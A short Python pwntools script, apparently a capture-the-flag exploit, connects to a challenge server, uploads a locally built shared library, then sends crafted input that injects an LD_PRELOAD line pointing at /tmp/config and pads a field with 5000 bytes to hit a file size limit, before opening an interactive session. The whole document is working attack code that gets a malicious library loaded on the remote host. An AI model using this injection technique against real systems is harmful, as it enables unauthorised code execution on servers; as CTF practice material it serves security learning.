from pwn import *
import os

p = remote("challenge.secso.cc", 7006)

os.system("make")
with open("libpreload.so", "rb") as f:
    p.send(f.read())

## Don't forget to max out the file size limit!!!!!!!!
p.send(b'\nLD_PRELOAD = /tmp/config' + b'\nv1 = ' + (b'1' * 5000) + b'\n')

p.interactive()